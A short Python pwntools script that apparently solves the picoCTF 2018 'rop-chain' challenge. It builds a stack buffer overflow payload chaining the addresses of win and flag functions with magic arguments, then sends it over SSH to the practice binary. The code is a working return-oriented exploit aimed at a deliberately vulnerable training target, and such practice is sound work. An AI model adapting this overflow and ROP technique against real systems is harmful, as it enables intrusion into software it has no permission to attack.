from pwn import *

arg1 = 0xBAAAAAAD
arg2 = 0xDEADBAAD

win1_addr = 0x080485cb
win2_addr = 0x080485d8
flag_addr = 0x0804862b


payload = 'a'*0x18 + 'a'*0x4 + p32(win1_addr) + p32(win2_addr) + p32(flag_addr) + p32(arg1) + p32(arg2)

s = ssh(host = '2018shell3.picoCTF.com', user = 'kruzXavier')
s.set_working_directory('/problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d')
r = s.process('./rop')

r.recvuntil('>')
r.sendline(payload)
print r.recvall()

s.close()


